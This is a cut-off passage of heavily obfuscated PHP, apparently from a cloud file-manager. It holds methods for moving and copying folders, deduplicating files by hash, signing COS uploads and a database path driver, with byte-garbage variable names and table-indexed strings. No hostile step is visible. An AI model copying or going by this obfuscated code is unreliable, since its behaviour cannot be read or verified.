$šöòŒà›); $ùÆ½šÇÀ = $this->_moveForce($¶»ª·”É, $Î€‰Şå„, $†Ú„È—Ë); } else { if ($¨ŸŞ†Ãä == REPEAT_REPLACE) { $ç€›˜æù = $this->sourceInfoCache($ó¥ÙŸºâ); $ĞÔ¥µÕí = $this->fileHistory($ç€›˜æù, $±ç®È´ó[$½•åéÏî[468]], $±ç®È´ó[$½•åéÏî[76]]); $ íøğÅ° = !0; if ($ĞÔ¥µÕí) { $‚·¶¢»[$½•åéÏî[557]][] = $±ç®È´ó[$½•åéÏî[468]]; } } } } } if ($ íøğÅ° && !$‚·¶¢»[$½•åéÏî[588]]) { $‚·¶¢»[$½•åéÏî[588]] = !0; } return $ùÆ½šÇÀ; } private function _moveForce($æòâ¸ƒ, $‰ü—İÊ, $úª×†‹½) { $˜Â‘„‘¯ =& $_SERVER[ì™ı‰º¯]; $Í×öüà¬ = $this->sourceInfo($æòâ¸ƒ); $¿¥…¼¯ê = $this->sourceInfo($‰ü—İÊ); $ÁıáÇÌ÷ = $Í×öüà¬[$˜Â‘„‘¯[410]] == $˜Â‘„‘¯[88]; $¿˜à—¹Š = array($˜Â‘„‘¯[401] => $¿¥…¼¯ê[$˜Â‘„‘¯[402]], $˜Â‘„‘¯[580] => $¿¥…¼¯ê[$˜Â‘„‘¯[511]] . $¿¥…¼¯ê[$˜Â‘„‘¯[402]] . $˜Â‘„‘¯[50], $˜Â‘„‘¯[576] => $¿¥…¼¯ê[$˜Â‘„‘¯[411]], $˜Â‘„‘¯[577] => $¿¥…¼¯ê[$˜Â‘„‘¯[496]], $˜Â‘„‘¯[579] => USER_ID, $˜Â‘„‘¯[420] => $úª×†‹½); $Ùìêäß = $Í×öüà¬[$˜Â‘„‘¯[411]] == SourceModel::TYPE_GROUP && $¿¥…¼¯ê[$˜Â‘„‘¯[411]] == SourceModel::TYPE_GROUP && $Í×öüà¬[$˜Â‘„‘¯[496]] == $¿¥…¼¯ê[$˜Â‘„‘¯[496]]; if (!$Ùìêäß && $this->moveClearAuth) { Model($˜Â‘„‘¯[493])->authClear($æòâ¸ƒ); } $Š‰×«ö = $Í×öüà¬[$˜Â‘„‘¯[431]] == $˜Â‘„‘¯[88] && $¿¥…¼¯ê[$˜Â‘„‘¯[431]] != $˜Â‘„‘¯[88]; if ($Š‰×«ö) { $¿˜à—¹Š[$˜Â‘„‘¯[430]] = 0; } if ($ÁıáÇÌ÷) { $¯Ú œÚÚ = array($˜Â‘„‘¯[580] => array($˜Â‘„‘¯[540], $Í×öüà¬[$˜Â‘„‘¯[511]] . $Í×öüà¬[$˜Â‘„‘¯[402]] . $˜Â‘„‘¯[541])); $„Œ“ùıı = $Í×öüà¬[$˜Â‘„‘¯[511]] . $Í×öüà¬[$˜Â‘„‘¯[402]] . $˜Â‘„‘¯[50]; $Ùè×İ‰ = $¿¥…¼¯ê[$˜Â‘„‘¯[511]] . $¿¥…¼¯ê[$˜Â‘„‘¯[402]] . $˜Â‘„‘¯[50] . $Í×öüà¬[$˜Â‘„‘¯[402]] . $˜Â‘„‘¯[50]; $ŒåÄ®¦§ = array($˜Â‘„‘¯[580] => array($˜Â‘„‘¯[589], "\162\145\160\154\x61\x63\x65\x28\160\141\162\145\156\x74\114\145\166\145\154\x2c\47{$„Œ“ùıı}\x27\54\47{$Ùè×İ‰}\47\51"), $˜Â‘„‘¯[576] => $¿¥…¼¯ê[$˜Â‘„‘¯[411]], $˜Â‘„‘¯[577] => $¿¥…¼¯ê[$˜Â‘„‘¯[496]]); if ($Š‰×«ö) { $ŒåÄ®¦§[$˜Â‘„‘¯[430]] = 0; } $this->where($¯Ú œÚÚ)->data($ŒåÄ®¦§)->save(); } $this->where(array($˜Â‘„‘¯[417] => $æòâ¸ƒ))->data($¿˜à—¹Š)->save(); return $æòâ¸ƒ; } private function clearShare($§ïÒÌˆ, $’ƒšÒ€¬) { $ß×—İÒÅ =& $_SERVER[ì™ı‰º¯]; $Ê¹¥èÀ¸ = $this->sourceInfo($§ïÒÌˆ); $´Èë ­ç = $this->sourceInfo($’ƒšÒ€¬); if ($Ê¹¥èÀ¸[$ß×—İÒÅ[496]] == $´Èë ­ç[$ß×—İÒÅ[496]] && $Ê¹¥èÀ¸[$ß×—İÒÅ[411]] == $ß×—İÒÅ[590]) { return; } $ó§šØ§€ = array($ß×—İÒÅ[511] => array($ß×—İÒÅ[540], $Ê¹¥èÀ¸[$ß×—İÒÅ[511]] . $§ïÒÌˆ . $ß×—İÒÅ[541])); $‘±Ÿè¶Í = $this->field($ß×—İÒÅ[417])->where($ó§šØ§€)->getField($ß×—İÒÅ[402], !0); if (!$‘±Ÿè¶Í) { return; } $ó§šØ§€ = array($ß×—İÒÅ[402] => array($ß×—İÒÅ[7], $‘±Ÿè¶Í), $ß×—İÒÅ[591] => 1); $˜°ÏÛÓ = Model($ß×—İÒÅ[592])->field($ß×—İÒÅ[593])->where($ó§šØ§€)->select(); if (!$˜°ÏÛÓ) { return; } $˜°ÏÛÓ = array_to_keyvalue($˜°ÏÛÓ, $ß×—İÒÅ[12], $ß×—İÒÅ[593]); $ó§šØ§€ = array($ß×—İÒÅ[593] => array($ß×—İÒÅ[7], $˜°ÏÛÓ)); Model($ß×—İÒÅ[592])->where($ó§šØ§€)->save(array($ß×—İÒÅ[591] => 0)); Model($ß×—İÒÅ[594])->where($ó§šØ§€)->delete(); } public function copyFolderFromIO($ŠÇ»À•ö, $…•ªÕôÁ, $›ºÊô, $ãä·ÒÌí, $ŠÖ ¼ÀÊ, $‹æ¤²Ã = false) { $ğè´…Ïş =& $_SERVER[ì™ı‰º¯]; $Óƒáñª = array($ğè´…Ïş[558] => array(), $ğè´…Ïş[559] => array(), $ğè´…Ïş[557] => array(), $ğè´…Ïş[595] => array()); $‰æå€²Â = $‹æ¤²Ã ? $‹æ¤²Ã : $ŠÇ»À•ö->pathThis($…•ªÕôÁ); $ŠÛÎ÷Ãº = $this->fileNameExist($›ºÊô, $‰æå€²Â); $µóÒšŒÛ = $this->mkdir($›ºÊô, $‰æå€²Â, $ãä·ÒÌí); if (!$ŠÛÎ÷Ãº || $ãä·ÒÌí == REPEAT_RENAME_FOLDER) { $ãä·ÒÌí = !1; } if ($ŠÛÎ÷Ãº) { $this->_childrenAllMake($ŠÛÎ÷Ãº); } Hook::trigger($ğè´…Ïş[596]); $this->_copyChildTo($ŠÇ»À•ö, $…•ªÕôÁ, $µóÒšŒÛ, $ãä·ÒÌí, $Óƒáñª, $ŠÖ ¼ÀÊ); Hook::trigger($ğè´…Ïş[597]); if ($µóÒšŒÛ) { $this->folderSizeResetChildren($µóÒšŒÛ); } $this->_childrenListClear(); Model($ğè´…Ïş[560])->addAll($Óƒáñª[$ğè´…Ïş[558]], array(), !0); Model($ğè´…Ïş[561])->eventCopy($µóÒšŒÛ); $this->saveAll($Óƒáñª[$ğè´…Ïş[559]]); Model($ğè´…Ïş[471])->linkAdd($Óƒáñª[$ğè´…Ïş[557]]); Model($ğè´…Ïş[471])->remove($Óƒáñª[$ğè´…Ïş[595]]); $this->folderSizeReset($›ºÊô); $this->updateModifyTime($›ºÊô); return $µóÒšŒÛ; } private function _copyChildTo($ºÑÀàÒ™, $ôĞšôüµ, $‹âÀ´£Õ, $’ªÊ‘õĞ, &$‰ĞØ›ÍÎ, $ïÒğ­¬Î) { $êĞ…Èòü =& $_SERVER[ì™ı‰º¯]; $÷µ…ˆ£ = $this->sourceInfoCache($‹âÀ´£Õ); $¬ôô†‡Ã = $ºÑÀàÒ™->listPath($ôĞšôüµ); $¬ôô†‡Ã = $¬ôô†‡Ã ? $¬ôô†‡Ã : array($êĞ…Èòü[83] => array(), $êĞ…Èòü[82] => array()); $Û‡öà º = array_merge($¬ôô†‡Ã[$êĞ…Èòü[83]], $¬ôô†‡Ã[$êĞ…Èòü[82]]); $…öò›Ö¯ = $this->_addFiles($ºÑÀàÒ™, $¬ôô†‡Ã[$êĞ…Èòü[83]], $ïÒğ­¬Î); $ªô–ïµÇ = array(); foreach ($Û‡öà º as &$ı«¢³±–) { if (isset($…öò›Ö¯[$ı«¢³±–[$êĞ…Èòü[32]]])) { $ı«¢³±– = $…öò›Ö¯[$ı«¢³±–[$êĞ…Èòü[32]]]; } $ı«¢³±–[$êĞ…Èòü[410]] = $ı«¢³±–[$êĞ…Èòü[33]] == $êĞ…Èòü[75]; $ı«¢³±–[$êĞ…Èòü[412]] = substr(_get($ı«¢³±–, $êĞ…Èòü[174], $êĞ…Èòü[12]), 0, 10); $ı«¢³±–[$êĞ…Èòü[76]] = _get($ı«¢³±–, $êĞ…Èòü[76], 0); $ı«¢³±–[$êĞ…Èòü[468]] = _get($ı«¢³±–, $êĞ…Èòü[468], 0); if (!isset($ı«¢³±–[$êĞ…Èòü[598]]) && $ı«¢³±–[$êĞ…Èòü[468]]) { $‰ĞØ›ÍÎ[$êĞ…Èòü[595]][] = $ı«¢³±–[$êĞ…Èòü[468]]; } if ($’ªÊ‘õĞ) { $Ö­ÔÃ½ = $this->fileNameExistCache($‹âÀ´£Õ, $ı«¢³±–[$êĞ…Èòü[32]]); if ($Ö­ÔÃ½) { if ($ı«¢³±–[$êĞ…Èòü[410]] || $’ªÊ‘õĞ == REPEAT_SKIP) { continue; } if ($’ªÊ‘õĞ == REPEAT_REPLACE) { $Ş±’¾Æ’ = $this->sourceInfoCache($Ö­ÔÃ½); $’¹ö˜§¸ = $this->fileHistory($Ş±’¾Æ’, $ı«¢³±–[$êĞ…Èòü[468]], $ı«¢³±–[$êĞ…Èòü[76]]); if ($’¹ö˜§¸) { $‰ĞØ›ÍÎ[$êĞ…Èòü[557]][] = $ı«¢³±–[$êĞ…Èòü[468]]; } continue; } else { if ($’ªÊ‘õĞ == REPEAT_RENAME) { $ı«¢³±–[$êĞ…Èòü[32]] = $this->fileNameAutoCache($‹âÀ´£Õ, $ı«¢³±–[$êĞ…Èòü[32]], $’ªÊ‘õĞ, !1); } } } } if (!$ı«¢³±–[$êĞ…Èòü[410]] && $ı«¢³±–[$êĞ…Èòü[468]] == 0) { continue; } if (!$ı«¢³±–[$êĞ…Èòü[410]] && $ı«¢³±–[$êĞ…Èòü[468]]) { $‰ĞØ›ÍÎ[$êĞ…Èòü[557]][] = $ı«¢³±–[$êĞ…Èòü[468]]; } $ªô–ïµÇ[] = $this->_makeItemData($ı«¢³±–, $÷µ…ˆ£, $ı«¢³±–[$êĞ…Èòü[32]]); } unset($ı«¢³±–); if (!empty($ªô–ïµÇ)) { $this->addAll($ªô–ïµÇ); $this->_childrenListSelect($‹âÀ´£Õ); } $”½·»íä = $this->_childrenList($‹âÀ´£Õ); $”½·»íä = array_to_keyvalue($”½·»íä, $êĞ…Èòü[32]); foreach ($Û‡öà º as $ı«¢³±–) { $Ş±’¾Æ’ = $”½·»íä[$ı«¢³±–[$êĞ…Èòü[32]]]; $Şç¯½¸Á = $Ş±’¾Æ’[$êĞ…Èòü[402]]; $this->_copyApplyMeta($Ş±’¾Æ’, $‰ĞØ›ÍÎ); if ($ı«¢³±–[$êĞ…Èòü[33]] == $êĞ…Èòü[75]) { $ı«¢³±–[$êĞ…Èòü[84]] = $ºÑÀàÒ™->getPathInner($ı«¢³±–[$êĞ…Èòü[84]]); $this->_copyChildTo($ºÑÀàÒ™, $ı«¢³±–[$êĞ…Èòü[84]], $Şç¯½¸Á, $’ªÊ‘õĞ, $‰ĞØ›ÍÎ, $ïÒğ­¬Î); } } } private function _addFiles($ÛëşêÄ, $Áİ¼ß, $‹çİ¾ÂÔ) { $ö‡‹Ëº„ =& $_SERVER[ì™ı‰º¯]; if (!$Áİ¼ß || count($Áİ¼ß) == 0) { return array(); } $´¨÷‚şÄ = array(); foreach ($Áİ¼ß as &$Õ©ïÃîô) { Hook::trigger($ö‡‹Ëº„[599], $Õ©ïÃîô); $Õ©ïÃîô[$ö‡‹Ëº„[84]] = $ÛëşêÄ->getPathInner($Õ©ïÃîô[$ö‡‹Ëº„[84]]); $¹Ø¢¿–ê = $ÛëşêÄ->hashSimple($Õ©ïÃîô[$ö‡‹Ëº„[84]]); $éã¹“‚Æ = $ÛëşêÄ->hashMd5($Õ©ïÃîô[$ö‡‹Ëº„[84]]); if (strlen($éã¹“‚Æ) > 10 && !isset($´¨÷‚şÄ[$éã¹“‚Æ])) { $´¨÷‚şÄ[$éã¹“‚Æ] = array(); } $Õ©ïÃîô[$ö‡‹Ëº„[177]] = $¹Ø¢¿–ê; $Õ©ïÃîô[$ö‡‹Ëº„[176]] = $éã¹“‚Æ; $´¨÷‚şÄ[$éã¹“‚Æ][] =& $Õ©ïÃîô; if (count($´¨÷‚şÄ[$éã¹“‚Æ]) > 1) { $Õ©ïÃîô[$ö‡‹Ëº„[598]] = !0; } Hook::trigger($ö‡‹Ëº„[600], $Õ©ïÃîô); } unset($Õ©ïÃîô); $ï‚ı•ä° = array($ö‡‹Ëº„[176] => array($ö‡‹Ëº„[7], array_keys($´¨÷‚şÄ))); $…ÅëÜïü = Model($ö‡‹Ëº„[601]); $çëô‡«ï = $…ÅëÜïü->where($ï‚ı•ä°)->select(); $çëô‡«ï = $çëô‡«ï ? $çëô‡«ï : array(); foreach ($çëô‡«ï as $İËıû) { if (!isset($´¨÷‚şÄ[$İËıû[$ö‡‹Ëº„[176]]])) { continue; } $ßË©é»Ú = $´¨÷‚şÄ[$İËıû[$ö‡‹Ëº„[176]]]; foreach ($ßË©é»Ú as &$Õ©ïÃîô) { $Õ©ïÃîô[$ö‡‹Ëº„[468]] = $İËıû[$ö‡‹Ëº„[468]]; $Õ©ïÃîô[$ö‡‹Ëº„[598]] = !0; } unset($Õ©ïÃîô); } $÷£õİÖ– = array(); foreach ($Áİ¼ß as $‹¨†÷ó) { Hook::trigger($ö‡‹Ëº„[602], $‹¨†÷ó); if (isset($‹¨†÷ó[$ö‡‹Ëº„[598]]) && $‹¨†÷ó[$ö‡‹Ëº„[598]]) { Hook::trigger($ö‡‹Ëº„[603], $‹¨†÷ó); continue; } $ğ¸Şñò = $ÛëşêÄ->getPathInner($‹¨†÷ó[$ö‡‹Ëº„[84]]); $Ùò‘ÜÉ = $…ÅëÜïü->addFileMake($ğ¸Şñò, $‹¨†÷ó[$ö‡‹Ëº„[76]], $‹¨†÷ó[$ö‡‹Ëº„[177]], $‹¨†÷ó[$ö‡‹Ëº„[176]], $‹¨†÷ó[$ö‡‹Ëº„[32]], $‹çİ¾ÂÔ); Hook::trigger($ö‡‹Ëº„[603], $‹¨†÷ó); if (!is_array($Ùò‘ÜÉ)) { continue; } $÷£õİÖ–[] = $Ùò‘ÜÉ; } $…ÅëÜïü->addAll($÷£õİÖ–); $ï‚ı•ä° = array($ö‡‹Ëº„[176] => array($ö‡‹Ëº„[7], array_keys($´¨÷‚şÄ))); $çëô‡«ï = $…ÅëÜïü->where($ï‚ı•ä°)->select(); $çëô‡«ï = $çëô‡«ï ? $çëô‡«ï : array(); foreach ($çëô‡«ï as $İËıû) { if (!isset($´¨÷‚şÄ[$İËıû[$ö‡‹Ëº„[176]]])) { continue; } $ï«ˆé© =& $´¨÷‚şÄ[$İËıû[$ö‡‹Ëº„[176]]]; foreach ($ï«ˆé© as &$Õ©ïÃîô) { $Õ©ïÃîô[$ö‡‹Ëº„[468]] = $İËıû[$ö‡‹Ëº„[468]]; } unset($Õ©ïÃîô); } $Ä‹÷Êìó = array(); foreach ($Áİ¼ß as $ÎôŞŠóÇ) { $Ä‹÷Êìó[$ÎôŞŠóÇ[$ö‡‹Ëº„[32]]] = $ÎôŞŠóÇ; } return $Ä‹÷Êìó; } } goto cÂ¹šóäæ ; B´Û¶©‚Ç¬: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ªâáÎ±) { parent::__construct($ªâáÎ±); $this->signatureVersion($_SERVER[ì™ı‰º¯][216]); } public function uploadFormData($•î´ÎÑ¯, $àÂ¯†Ï• = 3600) { $¡é²êò× =& $_SERVER[ì™ı‰º¯]; $¡ûÂ¾„ø = $¡é²êò×[199]; $ßÎ’šÇ‚ = $¡é²êò×[232]; $µÅÇ¢ªš = $¡é²êò×[1321]; $æçÄ–ÙÎ = gmdate($¡é²êò×[1322], time() + $àÂ¯†Ï•); $®—ªÉĞ– = (string) time() . $¡é²êò×[71] . (string) (time() + $àÂ¯†Ï•); $ÔİûØÊ = array($¡é²êò×[1323] => $æçÄ–ÙÎ, $¡é²êò×[1324] => array(array($¡é²êò×[1325] => $¡ûÂ¾„ø), array($¡é²êò×[1326] => $this->bucket), array($¡é²êò×[1327], $¡é²êò×[1328], $¡é²êò×[12]), array($¡é²êò×[1329] => $µÅÇ¢ªš), array($¡é²êò×[1330] => $ßÎ’šÇ‚), array($¡é²êò×[1331] => $this->accessKey), array($¡é²êò×[1332] => $®—ªÉĞ–))); $ÔİûØÊ = json_encode($ÔİûØÊ); $ª»áÂÖœ = hash_hmac($¡é²êò×[232], $®—ªÉĞ–, $this->secret); $´Ú‡†ƒŠ = sha1($ÔİûØÊ); $üÉÎ•ñ» = hash_hmac($¡é²êò×[232], $´Ú‡†ƒŠ, $ª»áÂÖœ); $§¶–Ô¤ = array($¡é²êò×[1325] => $¡ûÂ¾„ø, $¡é²êò×[1329] => $µÅÇ¢ªš, $¡é²êò×[1333] => base64_encode($ÔİûØÊ), $¡é²êò×[1330] => $ßÎ’šÇ‚, $¡é²êò×[1331] => $this->accessKey, $¡é²êò×[1334] => $®—ªÉĞ–, $¡é²êò×[1335] => $üÉÎ•ñ», $¡é²êò×[182] => $this->getHost()); return $§¶–Ô¤; } public function fileOutLink($©ĞçËıÉ) { $¾™ã¾“î =& $_SERVER[ì™ı‰º¯]; if (substr($©ĞçËıÉ, 0, 7) == $¾™ã¾“î[1336]) { $©ĞçËıÉ = $¾™ã¾“î[1337] . substr($©ĞçËıÉ, 7); } header($¾™ã¾“î[161] . $©ĞçËıÉ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¾‹åÎ€ú) { $this->pathParse = $¾‹åÎ€ú; $this->model = Model($_SERVER[ì™ı‰º¯][1338]); } public function getPath($°†ì©Ã­) { return trim($°†ì©Ã­, $_SERVER[ì™ı‰º¯][8]); } public function pathFather($ˆõôæ¶Ø) { $½™›¼Î = $this->parse($ˆõôæ¶Ø); $½™›¼Î = $this->infoSimple($ˆõôæ¶Ø); return $½™›¼Î ? $½™›¼Î[$_SERVER[ì™ı‰º¯][432]] : !1; } public function pathThis($êšö½é€) { $Ê²½²ış = $this->infoSimple($êšö½é€); return $Ê²½²ış ? $Ê²½²ış[$_SERVER[ì™ı‰º¯][32]] : !1; } public function getPathOuter($œÄŒÉÉé) { if (!$œÄŒÉÉé) { return $œÄŒÉÉé; } $üÓ¹Ùúı = $this->parse($œÄŒÉÉé); return KodIO::make($üÓ¹Ùúı[$_SERVER[ì™ı‰º¯][399]]); } public function copyFolderFromIO($œÕÀñ, $®¬µè, $™ëÙ—‚‹, $°úºÌŞ, $‘‘‘¸½) { $†¬ôóç­ = $this->model->copyFolderFromIO($œÕÀñ, $®¬µè, $™ëÙ—‚‹, $°úºÌŞ, $‘‘‘¸½); return KodIO::make($†¬ôóç­); } public function isParentOf($Ä…‚ŒŠ, $É×ª¿ĞÓ) { return $this->model->isParentOf($Ä…‚ŒŠ, $É×ª¿ĞÓ); } public function mkfile($ù­Øğ´Ê, $®‰ú‘¿Â = '', $ŞĞÕáş = REPEAT_RENAME) { $µ÷æ»á =& $_SERVER[ì™ı‰º¯]; $ªÜ•Ø = $this->parse($ù­Øğ´Ê); $ù­Øğ´Ê = $ªÜ•Ø[$µ÷æ»á[399]]; for ($æÃìÌŠ» = 0; $æÃìÌŠ» < count($ªÜ•Ø[$µ÷æ»á[1339]]); $æÃìÌŠ»++) { $œ·æÁ = $ªÜ•Ø[$µ÷æ»á[1339]][$æÃìÌŠ»]; if ($æÃìÌŠ» == count($ªÜ•Ø[$µ÷æ»á[1339]]) - 1) { $ù­Øğ´Ê = $this->model->mkfile($ù­Øğ´Ê, $œ·æÁ, $®‰ú‘¿Â, $ŞĞÕáş); break; } $ù­Øğ´Ê = $this->model->mkdir($ù­Øğ´Ê, $œ·æÁ, REPEAT_SKIP); } return $this->getPathOuter($ù­Øğ´Ê); } public function mkdir($Ì‹ß ¼ñ, $Ç»ºÈ¾ = REPEAT_SKIP) { $®•±€ï½ =& $_SERVER[ì™ı‰º¯]; $­ıúäÑİ = $this->parse($Ì‹ß ¼ñ); $Ì‹ß ¼ñ = $­ıúäÑİ[$®•±€ï½[399]]; for ($¥®ˆëš¥ = 0; $¥®ˆëš¥ < count($­ıúäÑİ[$®•±€ï½[1339]]); $¥®ˆëš¥++) { $¼¥–²ª³ = $­ıúäÑİ[$®•±€ï½[1339]][$¥®ˆëš¥]; $Ì‹ß ¼ñ = $this->model->mkdir($Ì‹ß ¼ñ, $¼¥–²ª³, $Ç»ºÈ¾); } return $this->getPathOuter($Ì‹ß ¼ñ); } public function copyFile($‰’´°, $ö„ş±éŒ, $’ƒç˜ÂÓ = REPEAT_REPLACE) { $½É‚”îÙ =& $_SERVER[ì™ı‰º¯]; $Ä„ı¿ = $this->parse($ö„ş±éŒ); $ºÁÃ¾ğ® = $this->model->copy($‰’´°, $Ä„ı¿[$½É‚”îÙ[399]], $’ƒç˜ÂÓ, $Ä„ı¿[$½É‚”îÙ[84]]); return $ºÁÃ¾ğ® ? $this->getPathOuter($ºÁÃ¾ğ®) : !1; } public function moveFile($£Ğ¢ôıˆ, $öŞâñûÜ, $¢Şß® ½ = REPEAT_REPLACE) { $û×Øü‚’ =& $_SERVER[ì™ı‰º¯]; $øˆÇœƒº = $this->parse($öŞâñûÜ); $ÔÙ¨Ÿì = $this->model->move($£Ğ¢ôıˆ, $øˆÇœƒº[$û×Øü‚’[399]], $¢Şß® ½, $øˆÇœƒº[$û×Øü‚’[84]]); return $ÔÙ¨Ÿì ? $this->getPathOuter($ÔÙ¨Ÿì) : !1; } public function copy($å°ÏÏ¢, $•¸Óšç, $ĞÈñ¤Àî = REPEAT_REPLACE, $ŒÄêÊŞÏ = false) { $”Ã²¦”ñ = $this->parse($•¸Óšç); $à–¨Í = $this->model->copy($å°ÏÏ¢, $”Ã²¦”ñ[$_SERVER[ì™ı‰º¯][399]], $ĞÈñ¤Àî, $ŒÄêÊŞÏ); return $à–¨Í ? $this->getPathOuter($à–¨Í) : !1; } public function moveSameAllow() { } public function move($Œò˜­õÈ, $®å›Áˆ, $àˆÉœä› = REPEAT_REPLACE, $ÜŞë‹´À = false) { $Ä«‰ŞÌ = $this->parse($®å›Áˆ); $¯ŞÖØŒ = $this->model->move($Œò˜­õÈ, $Ä«‰ŞÌ[$_SERVER[ì™ı‰º¯][399]], $àˆÉœä›, $ÜŞë‹´À); return $¯ŞÖØŒ ? $this->getPathOuter($¯ŞÖØŒ) : !1; } public function remove($³ÏÊ–‘®, $ú‘ñÔå¨ = true) { return $this->model->remove($³ÏÊ–‘®, $ú‘ñÔå¨); } public function rename($áËÆì¡, $ï—òä) { $¶ —ï = $this->model->rename($áËÆì¡, $ï—òä); return $¶ —ï ? $this->getPathOuter($áËÆì¡) : $¶ —ï; } public function size($…†–Œ ˆ) { $ªå†˜¾› = $this->infoSimple($…†–Œ ˆ); return $ªå†˜¾› ? $ªå†˜¾›[$_SERVER[ì™ı‰º¯][76]] : 0; } public function infoSimple($ˆ–±˜¥) { return $this->model->sourceInfo($ˆ–±˜¥); } public function info($½Û¨ã©Ë) { return $this->infoParse($½Û¨ã©Ë); } public function infoAuth($™×İÔŸ®) { return $this->infoParse($™×İÔŸ®, !1, !0); } public function infoWithChildren($•ÆÒ“÷á) { return $this->infoParse($•ÆÒ“÷á, !0); } protected function infoParse($‘¶ÔŞøî, $Ùå —÷” = false, $Éê«â¸ƒ = false) { if (!$Ùå —÷”) { return $this->model->pathInfo($‘¶ÔŞøî, $Éê«â¸ƒ); } return $this->model->pathInfoMore($‘¶ÔŞøî); } public function infoFull($ïÓ® ¨) { $øİ€¯‰ =& $_SERVER[ì™ı‰º¯]; $¼íÙó‡Ş = explode($øİ€¯‰[8], $ïÓ® ¨); $¥àïØÔ” = implode($øİ€¯‰[8], array_splice($¼íÙó‡Ş, 1)); return $this->model->pathInfoByPath($¼íÙó‡Ş[0], $¥àïØÔ”); } public function hashSimple($é¬›­¢á) { $Ö¡âÖÁ£ =& $_SERVER[ì™ı‰º¯]; $÷¤œÜßƒ = $this->infoWithChildren($é¬›­¢á); return $÷¤œÜßƒ[$Ö¡âÖÁ£[170]][$Ö¡âÖÁ£[177]]; } public function hashMd5($‚Ééë) { $ùœˆı¬† =& $_SERVER[ì™ı‰º¯]; $‘×¾’µÅ = $this->infoWithChildren($‚Ééë); return $‘×¾’µÅ[$ùœˆı¬†[170]][$ùœˆı¬†[176]]; } public function exist($­äîÅê) { $®•òæí¦ =& $_SERVER[ì™ı‰º¯]; $¢–üµÜâ = $this->parse($­äîÅê); if (!$¢–üµÜâ[$®•òæí¦[84]]) { return $this->isFile($­äîÅê) || $this->isFolder($­äîÅê); } $‚ŞÓòØ‹ = array($®•òæí¦[401] => $¢–üµÜâ[$®•òæí¦[399]], $®•òæí¦[32] => $¢–üµÜâ[$®•òæí¦[84]]); $±ìÎéâ˜ = $this->model->where($‚ŞÓòØ‹)->find(); return $±ìÎéâ˜ ? !0 : !1; } public function isFile($Òñçˆ›Á) { $ÌùÉÎó =& $_SERVER[ì™ı‰º¯]; $ÛŞËşïÄ = $this->infoSimple($Òñçˆ›Á); return $ÛŞËşïÄ && $ÛŞËşïÄ[$ÌùÉÎó[410]] == $ÌùÉÎó[88] ? !1 : !0; } public function isFolder($Œæ®Ûù®) { $ –ñÊ» =& $_SERVER[ì™ı‰º¯]; $ì Ìäşö = $this->infoSimple($Œæ®Ûù®); return $ì Ìäşö && $ì Ìäşö[$ –ñÊ»[410]] == $ –ñÊ»[88] ? !0 : !1; } public function listPath($á­•âö“, $Ú§ÓÉåø = false) { $Ïé¯å† =& $_SERVER[ì™ı‰º¯]; if ($á­•âö“ == $Ïé¯å†[12]) { return !1; } $ªÛÀŒ×¤ = array($Ïé¯å†[401] => $á­•âö“); if ($Ú§ÓÉåø) { return $this->model->listSource($ªÛÀŒ×¤, -1); } return $this->model->listSource($ªÛÀŒ×¤); } public function has($´½­£Æú, $Ğ¿î×åµ = false, $¹•€¤Ê‡ = null) { $ò ¥İ =& $_SERVER[ì™ı‰º¯]; $´øğ±„Ÿ = $this->infoWithChildren($´½­£Æú); if ($Ğ¿î×åµ) { return array($ò ¥İ[208] => $´øğ±„Ÿ[$ò ¥İ[208]], $ò ¥İ[207] => $´øğ±„Ÿ[$ò ¥İ[207]]); } return $¹•€¤Ê‡ ? $´øğ±„Ÿ[$ò ¥İ[208]] : $´øğ±„Ÿ[$ò ¥İ[207]]; } public function listAll($úŠ¼÷) { $ÌšÖŒŒÛ = IO::info($this->pathParse[$_SERVER[ì™ı‰º¯][84]]); if (!$ÌšÖŒŒÛ) { return array(); } return $this->model->listAll($úŠ¼÷); } public function getContent($ôœŒôã) { return $this->model->getContent($ôœŒôã); } public function setContent($õú¶××ñ, $‡“ª¢Ó = '') { return $this->model->setContent($õú¶××ñ, $‡“ª¢Ó); } public function fileSubstr($œêéÈ÷‚, $Æ‡Õ®½ö, $©¯£…ûè) { return $this->model->fileSubstr($œêéÈ÷‚, $Æ‡Õ®½ö, $©¯£…ûè); } public function download($ó–¿ßĞ¡, $èé§ã = '') { $ˆ£Ú¦‰ = get_path_father($èé§ã); $ş™ÏÌ–ì = get_path_this($èé§ã); $Œçñ£ìÕ = $this->model->fileInfoGet($ó–¿ßĞ¡); $¤ÅÔî¾ = IO::copy($Œçñ£ìÕ[$_SERVER[ì™ı‰º¯][84]], $ˆ£Ú¦‰, !1, $ş™ÏÌ–ì); return $¤ÅÔî¾; } public function setModifyTime($ĞâÛ¡—–, $— ¨Ë² = '') { $ßÒç†à =& $_SERVER[ì™ı‰º¯]; if (!$ĞâÛ¡—–) { return; } $this->model->where(array($ßÒç†à[417] => $ĞâÛ¡—–))->save(array($ßÒç†à[85] => $— ¨Ë²)); } public function upload($©Ş¡‰, $ù¬­‘Íé, $û©ã¬ù• = false, $èü°æä¼ = REPEAT_REPLACE) { $Ğ–æâØ¨ =& $_SERVER[ì™ı‰º¯]; $Û°”À† = $this->parse($©Ş¡‰); $îşˆà¼ı = $this->model->addFile($Û°”À†[$Ğ–æâØ¨[399]], $ù¬­‘Íé, $Û°”À†[$Ğ–æâØ¨[84]], $û©ã¬ù•, $èü°æä¼); return $this->getPathOuter($îşˆà¼ı); } public function uploadFileByID($°‰âÔ, $¼ÒÎà¤, $ĞÁƒ–Ô) { $£Ó‡ÆÈå =& $_SERVER[ì™ı‰º¯]; $Êà½Ì© = $this->parse($°‰âÔ); $ç—Ÿîì¬ = $this->model->addFileByFileID($Êà½Ì©[$£Ó‡ÆÈå[399]], $¼ÒÎà¤, $Êà½Ì©[$£Ó‡ÆÈå[84]], $ĞÁƒ–Ô); return $this->getPathOuter($ç—Ÿîì¬); } public function addFileByRemote($À¾‚‡, $œº•ÙÜò, $Ìì«úÃ› = array(), $å™²ãÕ„ = '', $íæôÊ¤é) { $Ş…œúĞû =& $_SERVER[ì™ı‰º¯]; $¸ß¸·°‹ = $this->parse($À¾‚‡); $å™²ãÕ„ = empty($å™²ãÕ„) ? $¸ß¸·°‹[$Ş…œúĞû[84]] : $å™²ãÕ„; $ÁüÙÎ‡è = $this->model->addFileByRemote($¸ß¸·°‹[$Ş…œúĞû[399]], $œº•ÙÜò, $å™²ãÕ„, $Ìì«úÃ›, $íæôÊ¤é); return $this->getPathOuter($ÁüÙÎ‡è); } public function uploadLink($Áóêúùã, $ò§ÓßÃñ 